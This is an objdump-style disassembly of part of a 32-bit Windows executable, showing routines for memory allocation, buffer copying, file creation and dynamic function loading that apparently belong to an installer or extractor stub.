  401666:	83 c4 08             	add    $0x8,%esp
  401669:	c2 04 00             	ret    $0x4
  40166c:	90                   	nop
  40166d:	90                   	nop
  40166e:	90                   	nop
  40166f:	90                   	nop
  401670:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401674:	85 c9                	test   %ecx,%ecx
  401676:	74 1f                	je     0x401697
  401678:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40167c:	8b 54 24 04          	mov    0x4(%esp),%edx
  401680:	50                   	push   %eax
  401681:	68 c8 00 00 00       	push   $0xc8
  401686:	89 10                	mov    %edx,(%eax)
  401688:	8d 44 24 10          	lea    0x10(%esp),%eax
  40168c:	50                   	push   %eax
  40168d:	51                   	push   %ecx
  40168e:	ff 15 50 35 40 00    	call   *0x403550
  401694:	83 c4 10             	add    $0x10,%esp
  401697:	b8 01 00 00 00       	mov    $0x1,%eax
  40169c:	c2 0c 00             	ret    $0xc
  40169f:	90                   	nop
  4016a0:	a1 cd 20 40 00       	mov    0x4020cd,%eax
  4016a5:	83 ec 2c             	sub    $0x2c,%esp
  4016a8:	53                   	push   %ebx
  4016a9:	55                   	push   %ebp
  4016aa:	33 ed                	xor    %ebp,%ebp
  4016ac:	56                   	push   %esi
  4016ad:	85 c0                	test   %eax,%eax
  4016af:	57                   	push   %edi
  4016b0:	0f 84 b1 00 00 00    	je     0x401767
  4016b6:	8d 44 24 14          	lea    0x14(%esp),%eax
  4016ba:	6a 28                	push   $0x28
  4016bc:	50                   	push   %eax
  4016bd:	e8 9e 05 00 00       	call   0x401c60
  4016c2:	8b 74 24 48          	mov    0x48(%esp),%esi
  4016c6:	56                   	push   %esi
  4016c7:	68 00 02 00 00       	push   $0x200
  4016cc:	ff 15 1c 20 40 00    	call   *0x40201c
  4016d2:	8b 3d 18 20 40 00    	mov    0x402018,%edi
  4016d8:	56                   	push   %esi
  4016d9:	ff d7                	call   *%edi
  4016db:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%eax,%esi,1)
  4016e0:	75 08                	jne    0x4016ea
  4016e2:	56                   	push   %esi
  4016e3:	ff d7                	call   *%edi
  4016e5:	c6 44 30 ff 00       	movb   $0x0,-0x1(%eax,%esi,1)
  4016ea:	8b 7c 24 4c          	mov    0x4c(%esp),%edi
  4016ee:	56                   	push   %esi
  4016ef:	68 34 30 40 00       	push   $0x403034
  4016f4:	57                   	push   %edi
  4016f5:	ff 15 9c 20 40 00    	call   *0x40209c
  4016fb:	83 c4 0c             	add    $0xc,%esp
  4016fe:	57                   	push   %edi
  4016ff:	ff 15 14 20 40 00    	call   *0x402014
  401705:	83 f8 ff             	cmp    $0xffffffff,%eax
  401708:	75 5d                	jne    0x401767
  40170a:	6a 00                	push   $0x0
  40170c:	6a 00                	push   $0x0
  40170e:	6a 02                	push   $0x2
  401710:	6a 00                	push   $0x0
  401712:	6a 00                	push   $0x0
  401714:	68 00 00 00 c0       	push   $0xc0000000
  401719:	57                   	push   %edi
  40171a:	ff 15 10 20 40 00    	call   *0x402010
  401720:	8b d8                	mov    %eax,%ebx
  401722:	83 fb ff             	cmp    $0xffffffff,%ebx
  401725:	0f 85 86 00 00 00    	jne    0x4017b1
  40172b:	85 ed                	test   %ebp,%ebp
  40172d:	0f 85 c4 00 00 00    	jne    0x4017f7
  401733:	68 2c 30 40 00       	push   $0x40302c
  401738:	56                   	push   %esi
  401739:	ff 15 0c 20 40 00    	call   *0x40200c
  40173f:	55                   	push   %ebp
  401740:	56                   	push   %esi
  401741:	ff 15 08 20 40 00    	call   *0x402008
  401747:	56                   	push   %esi
  401748:	68 34 30 40 00       	push   $0x403034
  40174d:	57                   	push   %edi
  40174e:	bd 01 00 00 00       	mov    $0x1,%ebp
  401753:	ff 15 9c 20 40 00    	call   *0x40209c
  401759:	83 c4 0c             	add    $0xc,%esp
  40175c:	57                   	push   %edi
  40175d:	ff 15 14 20 40 00    	call   *0x402014
  401763:	3b c3                	cmp    %ebx,%eax
  401765:	74 a3                	je     0x40170a
  401767:	8b 7c 24 40          	mov    0x40(%esp),%edi
  40176b:	a0 ca 20 40 00       	mov    0x4020ca,%al
  401770:	84 c0                	test   %al,%al
  401772:	0f 84 97 00 00 00    	je     0x40180f
  401778:	8b 0d cd 20 40 00    	mov    0x4020cd,%ecx
  40177e:	6a 28                	push   $0x28
  401780:	03 f9                	add    %ecx,%edi
  401782:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401786:	51                   	push   %ecx
  401787:	e8 d4 04 00 00       	call   0x401c60
  40178c:	8b 07                	mov    (%edi),%eax
  40178e:	8d 54 24 14          	lea    0x14(%esp),%edx
  401792:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  401796:	52                   	push   %edx
  401797:	50                   	push   %eax
  401798:	83 c7 04             	add    $0x4,%edi
  40179b:	51                   	push   %ecx
  40179c:	57                   	push   %edi
  40179d:	e8 0e fb ff ff       	call   0x4012b0
  4017a2:	5f                   	pop    %edi
  4017a3:	5e                   	pop    %esi
  4017a4:	5d                   	pop    %ebp
  4017a5:	b8 01 00 00 00       	mov    $0x1,%eax
  4017aa:	5b                   	pop    %ebx
  4017ab:	83 c4 2c             	add    $0x2c,%esp
  4017ae:	c2 10 00             	ret    $0x10
  4017b1:	8b 7c 24 40          	mov    0x40(%esp),%edi
  4017b5:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  4017b9:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4017bd:	8b 17                	mov    (%edi),%edx
  4017bf:	51                   	push   %ecx
  4017c0:	52                   	push   %edx
  4017c1:	8d 47 04             	lea    0x4(%edi),%eax
  4017c4:	55                   	push   %ebp
  4017c5:	50                   	push   %eax
  4017c6:	e8 e5 fa ff ff       	call   0x4012b0
  4017cb:	8b 17                	mov    (%edi),%edx
  4017cd:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4017d1:	6a 00                	push   $0x0
  4017d3:	51                   	push   %ecx
  4017d4:	52                   	push   %edx
  4017d5:	55                   	push   %ebp
  4017d6:	53                   	push   %ebx
  4017d7:	ff 15 04 20 40 00    	call   *0x402004
  4017dd:	85 c0                	test   %eax,%eax
  4017df:	74 16                	je     0x4017f7
  4017e1:	8b 44 24 10          	mov    0x10(%esp),%eax
  4017e5:	8b 0f                	mov    (%edi),%ecx
  4017e7:	3b c1                	cmp    %ecx,%eax
  4017e9:	75 0c                	jne    0x4017f7
  4017eb:	53                   	push   %ebx
  4017ec:	ff 15 00 20 40 00    	call   *0x402000
  4017f2:	e9 74 ff ff ff       	jmp    0x40176b
  4017f7:	68 10 30 40 00       	push   $0x403010
  4017fc:	56                   	push   %esi
  4017fd:	ff 15 0c 20 40 00    	call   *0x40200c
  401803:	5f                   	pop    %edi
  401804:	5e                   	pop    %esi
  401805:	5d                   	pop    %ebp
  401806:	33 c0                	xor    %eax,%eax
  401808:	5b                   	pop    %ebx
  401809:	83 c4 2c             	add    $0x2c,%esp
  40180c:	c2 10 00             	ret    $0x10
  40180f:	8b 15 d1 20 40 00    	mov    0x4020d1,%edx
  401815:	8b 44 24 44          	mov    0x44(%esp),%eax
  401819:	52                   	push   %edx
  40181a:	57                   	push   %edi
  40181b:	50                   	push   %eax
  40181c:	e8 af 04 00 00       	call   0x401cd0
  401821:	5f                   	pop    %edi
  401822:	5e                   	pop    %esi
  401823:	5d                   	pop    %ebp
  401824:	b8 01 00 00 00       	mov    $0x1,%eax
  401829:	5b                   	pop    %ebx
  40182a:	83 c4 2c             	add    $0x2c,%esp
  40182d:	c2 10 00             	ret    $0x10
  401830:	8b 44 24 04          	mov    0x4(%esp),%eax
  401834:	83 f8 05             	cmp    $0x5,%eax
  401837:	77 37                	ja     0x401870
  401839:	ff 24 85 78 18 40 00 	jmp    *0x401878(,%eax,4)
  401840:	b8 b0 20 40 00       	mov    $0x4020b0,%eax
  401845:	c2 04 00             	ret    $0x4
  401848:	b8 20 1c 40 00       	mov    $0x401c20,%eax
  40184d:	c2 04 00             	ret    $0x4
  401850:	b8 40 1c 40 00       	mov    $0x401c40,%eax
  401855:	c2 04 00             	ret    $0x4
  401858:	b8 60 1c 40 00       	mov    $0x401c60,%eax
  40185d:	c2 04 00             	ret    $0x4
  401860:	b8 d0 1c 40 00       	mov    $0x401cd0,%eax
  401865:	c2 04 00             	ret    $0x4
  401868:	b8 70 16 40 00       	mov    $0x401670,%eax
  40186d:	c2 04 00             	ret    $0x4
  401870:	33 c0                	xor    %eax,%eax
  401872:	c2 04 00             	ret    $0x4
  401875:	8d 49 00             	lea    0x0(%ecx),%ecx
  401878:	40                   	inc    %eax
  401879:	18 40 00             	sbb    %al,0x0(%eax)
  40187c:	48                   	dec    %eax
  40187d:	18 40 00             	sbb    %al,0x0(%eax)
  401880:	50                   	push   %eax
  401881:	18 40 00             	sbb    %al,0x0(%eax)
  401884:	58                   	pop    %eax
  401885:	18 40 00             	sbb    %al,0x0(%eax)
  401888:	60                   	pusha
  401889:	18 40 00             	sbb    %al,0x0(%eax)
  40188c:	68 18 40 00 56       	push   $0x56004018
  401891:	8b 74 24 08          	mov    0x8(%esp),%esi
  401895:	57                   	push   %edi
  401896:	8b 3d 20 20 40 00    	mov    0x402020,%edi
  40189c:	68 54 30 40 00       	push   $0x403054
  4018a1:	56                   	push   %esi
  4018a2:	ff d7                	call   *%edi
  4018a4:	85 c0                	test   %eax,%eax
  4018a6:	75 0a                	jne    0x4018b2
  4018a8:	5f                   	pop    %edi
  4018a9:	b8 b0 12 40 00       	mov    $0x4012b0,%eax
  4018ae:	5e                   	pop    %esi
  4018af:	c2 04 00             	ret    $0x4
  4018b2:	68 44 30 40 00       	push   $0x403044
  4018b7:	56                   	push   %esi
  4018b8:	ff d7                	call   *%edi
  4018ba:	f7 d8                	neg    %eax
  4018bc:	1b c0                	sbb    %eax,%eax
  4018be:	5f                   	pop    %edi
  4018bf:	f7 d0                	not    %eax
  4018c1:	25 30 18 40 00       	and    $0x401830,%eax
  4018c6:	5e                   	pop    %esi
  4018c7:	c2 04 00             	ret    $0x4
  4018ca:	90                   	nop
  4018cb:	90                   	nop
  4018cc:	90                   	nop
  4018cd:	90                   	nop
  4018ce:	90                   	nop
  4018cf:	90                   	nop
  4018d0:	81 ec 0c 08 00 00    	sub    $0x80c,%esp
  4018d6:	8d 84 24 0c 04 00 00 	lea    0x40c(%esp),%eax
  4018dd:	53                   	push   %ebx
  4018de:	56                   	push   %esi
  4018df:	57                   	push   %edi
  4018e0:	68 00 02 00 00       	push   $0x200
  4018e5:	50                   	push   %eax
  4018e6:	6a 00                	push   $0x0
  4018e8:	ff 15 4c 20 40 00    	call   *0x40204c
  4018ee:	a1 d5 20 40 00       	mov    0x4020d5,%eax
  4018f3:	8b 3d 9c 20 40 00    	mov    0x40209c,%edi
  4018f9:	85 c0                	test   %eax,%eax
  4018fb:	74 41                	je     0x40193e
  4018fd:	50                   	push   %eax
  4018fe:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  401902:	68 9c 31 40 00       	push   $0x40319c
  401907:	51                   	push   %ecx
  401908:	ff d7                	call   *%edi
  40190a:	83 c4 0c             	add    $0xc,%esp
  40190d:	8d 54 24 18          	lea    0x18(%esp),%edx
  401911:	52                   	push   %edx
  401912:	6a 01                	push   $0x1
  401914:	6a 00                	push   $0x0
  401916:	ff 15 48 20 40 00    	call   *0x402048
  40191c:	ff 15 44 20 40 00    	call   *0x402044
  401922:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401927:	75 15                	jne    0x40193e
  401929:	8d 44 24 18          	lea    0x18(%esp),%eax
  40192d:	68 78 31 40 00       	push   $0x403178
  401932:	50                   	push   %eax
  401933:	ff 15 0c 20 40 00    	call   *0x40200c
  401939:	e9 8c 01 00 00       	jmp    0x401aca
  40193e:	a1 c4 20 40 00       	mov    0x4020c4,%eax
  401943:	85 c0                	test   %eax,%eax
  401945:	74 4c                	je     0x401993
  401947:	6a 00                	push   $0x0
  401949:	6a 00                	push   $0x0
  40194b:	6a 03                	push   $0x3
  40194d:	6a 00                	push   $0x0
  40194f:	6a 03                	push   $0x3
  401951:	8d 8c 24 2c 04 00 00 	lea    0x42c(%esp),%ecx
  401958:	68 00 00 00 80       	push   $0x80000000
  40195d:	51                   	push   %ecx
  40195e:	ff 15 10 20 40 00    	call   *0x402010
  401964:	8b f0                	mov    %eax,%esi
  401966:	6a 00                	push   $0x0
  401968:	56                   	push   %esi
  401969:	ff 15 40 20 40 00    	call   *0x402040
  40196f:	39 05 c4 20 40 00    	cmp    %eax,0x4020c4
  401975:	76 15                	jbe    0x40198c
  401977:	8d 54 24 18          	lea    0x18(%esp),%edx
  40197b:	68 e8 30 40 00       	push   $0x4030e8
  401980:	52                   	push   %edx
  401981:	ff 15 0c 20 40 00    	call   *0x40200c
  401987:	e9 3e 01 00 00       	jmp    0x401aca
  40198c:	56                   	push   %esi
  40198d:	ff 15 00 20 40 00    	call   *0x402000
  401993:	6a 00                	push   $0x0
  401995:	ff 15 3c 20 40 00    	call   *0x40203c
  40199b:	8b 1d a8 20 40 00    	mov    0x4020a8,%ebx
  4019a1:	8b 0d cd 20 40 00    	mov    0x4020cd,%ecx
  4019a7:	8b f0                	mov    %eax,%esi
  4019a9:	8b 04 1e             	mov    (%esi,%ebx,1),%eax
  4019ac:	03 f3                	add    %ebx,%esi
  4019ae:	8b 0c 31             	mov    (%ecx,%esi,1),%ecx
  4019b1:	3b c1                	cmp    %ecx,%eax
  4019b3:	77 02                	ja     0x4019b7
  4019b5:	8b c1                	mov    %ecx,%eax
  4019b7:	05 00 04 00 00       	add    $0x400,%eax
  4019bc:	50                   	push   %eax
  4019bd:	e8 5e 02 00 00       	call   0x401c20
  4019c2:	8b d8                	mov    %eax,%ebx
  4019c4:	8d 94 24 18 02 00 00 	lea    0x218(%esp),%edx
  4019cb:	8d 44 24 18          	lea    0x18(%esp),%eax
  4019cf:	52                   	push   %edx
  4019d0:	50                   	push   %eax
  4019d1:	53                   	push   %ebx
  4019d2:	56                   	push   %esi
  4019d3:	e8 c8 fc ff ff       	call   0x4016a0
  4019d8:	85 c0                	test   %eax,%eax
  4019da:	0f 84 ea 00 00 00    	je     0x401aca
  4019e0:	8d 8c 24 18 02 00 00 	lea    0x218(%esp),%ecx
  4019e7:	51                   	push   %ecx
  4019e8:	ff 15 38 20 40 00    	call   *0x402038
  4019ee:	8b f0                	mov    %eax,%esi
  4019f0:	85 f6                	test   %esi,%esi
  4019f2:	75 1c                	jne    0x401a10
  4019f4:	8d 94 24 18 02 00 00 	lea    0x218(%esp),%edx
  4019fb:	8d 44 24 18          	lea    0x18(%esp),%eax
  4019ff:	52                   	push   %edx
  401a00:	68 d8 30 40 00       	push   $0x4030d8
  401a05:	50                   	push   %eax
  401a06:	ff d7                	call   *%edi
  401a08:	83 c4 0c             	add    $0xc,%esp
  401a0b:	e9 ba 00 00 00       	jmp    0x401aca
  401a10:	8b 3d 34 20 40 00    	mov    0x402034,%edi
  401a16:	55                   	push   %ebp
  401a17:	68 cc 30 40 00       	push   $0x4030cc
  401a1c:	56                   	push   %esi
  401a1d:	ff d7                	call   *%edi
  401a1f:	68 bc 30 40 00       	push   $0x4030bc
  401a24:	56                   	push   %esi
  401a25:	8b e8                	mov    %eax,%ebp
  401a27:	ff d7                	call   *%edi
  401a29:	68 b0 30 40 00       	push   $0x4030b0
  401a2e:	56                   	push   %esi
  401a2f:	89 44 24 20          	mov    %eax,0x20(%esp)
  401a33:	ff d7                	call   *%edi
  401a35:	68 a4 30 40 00       	push   $0x4030a4
  401a3a:	56                   	push   %esi
  401a3b:	89 44 24 18          	mov    %eax,0x18(%esp)
  401a3f:	ff d7                	call   *%edi
  401a41:	68 98 30 40 00       	push   $0x403098
  401a46:	56                   	push   %esi
  401a47:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401a4b:	ff d7                	call   *%edi
  401a4d:	8b 15 c8 20 40 00    	mov    0x4020c8,%edx
  401a53:	33 c9                	xor    %ecx,%ecx
  401a55:	66 8b 0d cb 20 40 00 	mov    0x4020cb,%cx
  401a5c:	81 e2 ff 00 00 00    	and    $0xff,%edx
  401a62:	0b ca                	or     %edx,%ecx
  401a64:	a3 50 35 40 00       	mov    %eax,0x403550
  401a69:	83 c9 02             	or     $0x2,%ecx
  401a6c:	51                   	push   %ecx
  401a6d:	ff d5                	call   *%ebp
  401a6f:	68 90 18 40 00       	push   $0x401890
  401a74:	6a 04                	push   $0x4
  401a76:	ff 54 24 1c          	call   *0x1c(%esp)
  401a7a:	8b 03                	mov    (%ebx),%eax
  401a7c:	5d                   	pop    %ebp
  401a7d:	3d 47 45 00 00       	cmp    $0x4547,%eax
  401a82:	74 12                	je     0x401a96
  401a84:	8d 44 24 18          	lea    0x18(%esp),%eax
  401a88:	68 68 30 40 00       	push   $0x403068
  401a8d:	50                   	push   %eax
  401a8e:	ff 15 0c 20 40 00    	call   *0x40200c
  401a94:	eb 34                	jmp    0x401aca
  401a96:	6a 05                	push   $0x5
  401a98:	53                   	push   %ebx
  401a99:	ff 54 24 14          	call   *0x14(%esp)
  401a9d:	53                   	push   %ebx
  401a9e:	8b f8                	mov    %eax,%edi
  401aa0:	e8 9b 01 00 00       	call   0x401c40
  401aa5:	ff 54 24 14          	call   *0x14(%esp)
  401aa9:	8b 1d 30 20 40 00    	mov    0x402030,%ebx
  401aaf:	56                   	push   %esi
  401ab0:	ff d3                	call   *%ebx
  401ab2:	56                   	push   %esi
  401ab3:	ff d3                	call   *%ebx
  401ab5:	8d 8c 24 18 02 00 00 	lea    0x218(%esp),%ecx
  401abc:	51                   	push   %ecx
  401abd:	ff 15 2c 20 40 00    	call   *0x40202c
  401ac3:	57                   	push   %edi
  401ac4:	ff 15 28 20 40 00    	call   *0x402028
  401aca:	8d 94 24 18 04 00 00 	lea    0x418(%esp),%edx
  401ad1:	8d 84 24 18 06 00 00 	lea    0x618(%esp),%eax
  401ad8:	52                   	push   %edx
  401ad9:	68 60 30 40 00       	push   $0x403060
  401ade:	50                   	push   %eax
  401adf:	ff 15 0c 20 40 00    	call   *0x40200c
  401ae5:	50                   	push   %eax
  401ae6:	ff 15 24 20 40 00    	call   *0x402024
  401aec:	8d 8c 24 18 06 00 00 	lea    0x618(%esp),%ecx
  401af3:	6a 10                	push   $0x10
  401af5:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  401af9:	51                   	push   %ecx
  401afa:	52                   	push   %edx
  401afb:	6a 00                	push   $0x0
  401afd:	ff 15 98 20 40 00    	call   *0x402098
  401b03:	6a 00                	push   $0x0
  401b05:	ff 15 28 20 40 00    	call   *0x402028
  401b0b:	5f                   	pop    %edi
  401b0c:	5e                   	pop    %esi
  401b0d:	33 c0                	xor    %eax,%eax
  401b0f:	5b                   	pop    %ebx
  401b10:	81 c4 0c 08 00 00    	add    $0x80c,%esp
  401b16:	c2 10 00             	ret    $0x10
  401b19:	90                   	nop
  401b1a:	90                   	nop
  401b1b:	90                   	nop
  401b1c:	90                   	nop
  401b1d:	90                   	nop
  401b1e:	90                   	nop
  401b1f:	90                   	nop
  401b20:	56                   	push   %esi
  401b21:	8b d1                	mov    %ecx,%edx
  401b23:	b8 01 00 00 00       	mov    $0x1,%eax
  401b28:	be 01 00 00 00       	mov    $0x1,%esi
  401b2d:	8b c8                	mov    %eax,%ecx
  401b2f:	d3 e6                	shl    %cl,%esi
  401b31:	3b d6                	cmp    %esi,%edx
  401b33:	72 0b                	jb     0x401b40
  401b35:	40                   	inc    %eax
  401b36:	83 f8 20             	cmp    $0x20,%eax
  401b39:	72 ed                	jb     0x401b28
  401b3b:	b8 20 00 00 00       	mov    $0x20,%eax
  401b40:	5e                   	pop    %esi
  401b41:	c3                   	ret
  401b42:	90                   	nop
  401b43:	90                   	nop
  401b44:	90                   	nop
  401b45:	90                   	nop
  401b46:	90                   	nop
  401b47:	90                   	nop
  401b48:	90                   	nop
  401b49:	90                   	nop
  401b4a:	90                   	nop
  401b4b:	90                   	nop
  401b4c:	90                   	nop
  401b4d:	90                   	nop
  401b4e:	90                   	nop
  401b4f:	90                   	nop
  401b50:	8b 0d ac 31 40 00    	mov    0x4031ac,%ecx
  401b56:	53                   	push   %ebx
  401b57:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401b5b:	55                   	push   %ebp
  401b5c:	56                   	push   %esi
  401b5d:	33 c0                	xor    %eax,%eax
  401b5f:	57                   	push   %edi
  401b60:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  401b66:	bf 03 00 00 00       	mov    $0x3,%edi
  401b6b:	ba 02 00 00 00       	mov    $0x2,%edx
  401b70:	a3 e0 32 40 00       	mov    %eax,0x4032e0
  401b75:	a3 e4 32 40 00       	mov    %eax,0x4032e4
  401b7a:	a3 e8 32 40 00       	mov    %eax,0x4032e8
  401b7f:	74 3f                	je     0x401bc0
  401b81:	be ec 32 40 00       	mov    $0x4032ec,%esi
  401b86:	8b 88 ac 31 40 00    	mov    0x4031ac(%eax),%ecx
  401b8c:	bd 01 00 00 00       	mov    $0x1,%ebp
  401b91:	d3 e5                	shl    %cl,%ebp
  401b93:	89 90 cc 33 40 00    	mov    %edx,0x4033cc(%eax)
  401b99:	83 c0 04             	add    $0x4,%eax
  401b9c:	03 d5                	add    %ebp,%edx
  401b9e:	47                   	inc    %edi
  401b9f:	8d 4a ff             	lea    -0x1(%edx),%ecx
  401ba2:	89 0e                	mov    %ecx,(%esi)
  401ba4:	8b 88 e8 32 40 00    	mov    0x4032e8(%eax),%ecx
  401baa:	3b cb                	cmp    %ebx,%ecx
  401bac:	8d b0 ec 32 40 00    	lea    0x4032ec(%eax),%esi
  401bb2:	73 0c                	jae    0x401bc0
  401bb4:	81 b8 ac 31 40 00 ff 	cmpl   $0xff,0x4031ac(%eax)
  401bbb:	00 00 00 
  401bbe:	75 c6                	jne    0x401b86
  401bc0:	8b 74 24 14          	mov    0x14(%esp),%esi
  401bc4:	8b cb                	mov    %ebx,%ecx
  401bc6:	89 7e 08             	mov    %edi,0x8(%esi)
  401bc9:	e8 52 ff ff ff       	call   0x401b20
  401bce:	89 46 0c             	mov    %eax,0xc(%esi)
  401bd1:	8b 0d 6c 32 40 00    	mov    0x40326c,%ecx
  401bd7:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  401bdd:	a3 b4 32 40 00       	mov    %eax,0x4032b4
  401be2:	ba 02 00 00 00       	mov    $0x2,%edx
  401be7:	74 2b                	je     0x401c14
  401be9:	33 c0                	xor    %eax,%eax
  401beb:	be 01 00 00 00       	mov    $0x1,%esi
  401bf0:	89 90 00 35 40 00    	mov    %edx,0x403500(%eax)
  401bf6:	d3 e6                	shl    %cl,%esi
  401bf8:	83 c0 04             	add    $0x4,%eax
  401bfb:	03 d6                	add    %esi,%edx
  401bfd:	8d 4a ff             	lea    -0x1(%edx),%ecx
  401c00:	89 88 9c 34 40 00    	mov    %ecx,0x40349c(%eax)
  401c06:	8b 88 6c 32 40 00    	mov    0x40326c(%eax),%ecx
  401c0c:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  401c12:	75 d7                	jne    0x401beb
  401c14:	5f                   	pop    %edi
  401c15:	5e                   	pop    %esi
  401c16:	5d                   	pop    %ebp
  401c17:	5b                   	pop    %ebx
  401c18:	c2 08 00             	ret    $0x8
  401c1b:	90                   	nop
  401c1c:	90                   	nop
  401c1d:	90                   	nop
  401c1e:	90                   	nop
  401c1f:	90                   	nop
  401c20:	8b 44 24 04          	mov    0x4(%esp),%eax
  401c24:	6a 04                	push   $0x4
  401c26:	68 00 30 00 00       	push   $0x3000
  401c2b:	50                   	push   %eax
  401c2c:	6a 00                	push   $0x0
  401c2e:	ff 15 50 20 40 00    	call   *0x402050
  401c34:	c2 04 00             	ret    $0x4
  401c37:	90                   	nop
  401c38:	90                   	nop
  401c39:	90                   	nop
  401c3a:	90                   	nop
  401c3b:	90                   	nop
  401c3c:	90                   	nop
  401c3d:	90                   	nop
  401c3e:	90                   	nop
  401c3f:	90                   	nop
  401c40:	8b 44 24 04          	mov    0x4(%esp),%eax
  401c44:	68 00 80 00 00       	push   $0x8000
  401c49:	6a 00                	push   $0x0
  401c4b:	50                   	push   %eax
  401c4c:	ff 15 54 20 40 00    	call   *0x402054
  401c52:	c2 04 00             	ret    $0x4
  401c55:	90                   	nop
  401c56:	90                   	nop
  401c57:	90                   	nop
  401c58:	90                   	nop
  401c59:	90                   	nop
  401c5a:	90                   	nop
  401c5b:	90                   	nop
  401c5c:	90                   	nop
  401c5d:	90                   	nop
  401c5e:	90                   	nop
  401c5f:	90                   	nop
  401c60:	56                   	push   %esi
  401c61:	8b 74 24 0c          	mov    0xc(%esp),%esi
  401c65:	8b 54 24 08          	mov    0x8(%esp),%edx
  401c69:	8b c6                	mov    %esi,%eax
  401c6b:	c1 f8 02             	sar    $0x2,%eax
  401c6e:	8b c8                	mov    %eax,%ecx
  401c70:	48                   	dec    %eax
  401c71:	57                   	push   %edi
  401c72:	8b fa                	mov    %edx,%edi
  401c74:	85 c9                	test   %ecx,%ecx
  401c76:	74 0e                	je     0x401c86
  401c78:	53                   	push   %ebx
  401c79:	8d 58 01             	lea    0x1(%eax),%ebx
  401c7c:	8b cb                	mov    %ebx,%ecx
  401c7e:	33 c0                	xor    %eax,%eax
  401c80:	f3 ab                	rep stos %eax,%es:(%edi)
  401c82:	8d 3c 9a             	lea    (%edx,%ebx,4),%edi
  401c85:	5b                   	pop    %ebx
  401c86:	83 e6 03             	and    $0x3,%esi
  401c89:	8b c6                	mov    %esi,%eax
  401c8b:	4e                   	dec    %esi
  401c8c:	85 c0                	test   %eax,%eax
  401c8e:	74 13                	je     0x401ca3
  401c90:	8d 4e 01             	lea    0x1(%esi),%ecx
  401c93:	33 c0                	xor    %eax,%eax
  401c95:	8b f1                	mov    %ecx,%esi
  401c97:	c1 e9 02             	shr    $0x2,%ecx
  401c9a:	f3 ab                	rep stos %eax,%es:(%edi)
  401c9c:	8b ce                	mov    %esi,%ecx
  401c9e:	83 e1 03             	and    $0x3,%ecx
  401ca1:	f3 aa                	rep stos %al,%es:(%edi)
  401ca3:	5f                   	pop    %edi
  401ca4:	8b c2                	mov    %edx,%eax
  401ca6:	5e                   	pop    %esi
  401ca7:	c2 08 00             	ret    $0x8
  401caa:	90                   	nop
  401cab:	90                   	nop
  401cac:	90                   	nop
  401cad:	90                   	nop
  401cae:	90                   	nop
  401caf:	90                   	nop
  401cb0:	56                   	push   %esi
  401cb1:	8b 74 24 08          	mov    0x8(%esp),%esi
  401cb5:	56                   	push   %esi
  401cb6:	e8 65 ff ff ff       	call   0x401c20
  401cbb:	56                   	push   %esi
  401cbc:	50                   	push   %eax
  401cbd:	e8 9e ff ff ff       	call   0x401c60
  401cc2:	5e                   	pop    %esi
  401cc3:	c2 04 00             	ret    $0x4
  401cc6:	90                   	nop
  401cc7:	90                   	nop
  401cc8:	90                   	nop
  401cc9:	90                   	nop
  401cca:	90                   	nop
  401ccb:	90                   	nop
  401ccc:	90                   	nop
  401ccd:	90                   	nop
  401cce:	90                   	nop
  401ccf:	90                   	nop
  401cd0:	55                   	push   %ebp
  401cd1:	56                   	push   %esi
  401cd2:	57                   	push   %edi
  401cd3:	8b 7c 24 18          	mov    0x18(%esp),%edi
  401cd7:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  401cdb:	8b 54 24 14          	mov    0x14(%esp),%edx
  401cdf:	8b f7                	mov    %edi,%esi
  401ce1:	8b cd                	mov    %ebp,%ecx
  401ce3:	c1 fe 02             	sar    $0x2,%esi
  401ce6:	8b c6                	mov    %esi,%eax
  401ce8:	4e                   	dec    %esi
  401ce9:	85 c0                	test   %eax,%eax
  401ceb:	74 0e                	je     0x401cfb
  401ced:	46                   	inc    %esi
  401cee:	8b 02                	mov    (%edx),%eax
  401cf0:	83 c2 04             	add    $0x4,%edx
  401cf3:	89 01                	mov    %eax,(%ecx)
  401cf5:	83 c1 04             	add    $0x4,%ecx
  401cf8:	4e                   	dec    %esi
  401cf9:	75 f3                	jne    0x401cee
  401cfb:	83 e7 03             	and    $0x3,%edi
  401cfe:	8b c7                	mov    %edi,%eax
  401d00:	4f                   	dec    %edi
  401d01:	85 c0                	test   %eax,%eax
  401d03:	74 0c                	je     0x401d11
  401d05:	8d 77 01             	lea    0x1(%edi),%esi
  401d08:	8a 02                	mov    (%edx),%al
  401d0a:	88 01                	mov    %al,(%ecx)
  401d0c:	41                   	inc    %ecx
  401d0d:	42                   	inc    %edx
  401d0e:	4e                   	dec    %esi
  401d0f:	75 f7                	jne    0x401d08
  401d11:	5f                   	pop    %edi
  401d12:	8b c5                	mov    %ebp,%eax
  401d14:	5e                   	pop    %esi
  401d15:	5d                   	pop    %ebp
  401d16:	c2 0c 00             	ret    $0xc
  401d19:	90                   	nop
  401d1a:	90                   	nop
  401d1b:	90                   	nop
  401d1c:	90                   	nop
  401d1d:	90                   	nop
  401d1e:	90                   	nop
  401d1f:	90                   	nop
  401d20:	55                   	push   %ebp
  401d21:	8b ec                	mov    %esp,%ebp
  401d23:	6a ff                	push   $0xffffffff
  401d25:	68 28 21 40 00       	push   $0x402128
  401d2a:	68 a0 1e 40 00       	push   $0x401ea0
  401d2f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401d35:	50                   	push   %eax
  401d36:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401d3d:	83 ec 68             	sub    $0x68,%esp
  401d40:	53                   	push   %ebx
  401d41:	56                   	push   %esi
  401d42:	57                   	push   %edi
  401d43:	89 65 e8             	mov    %esp,-0x18(%ebp)
  401d46:	33 db                	xor    %ebx,%ebx
  401d48:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401d4b:	6a 02                	push   $0x2
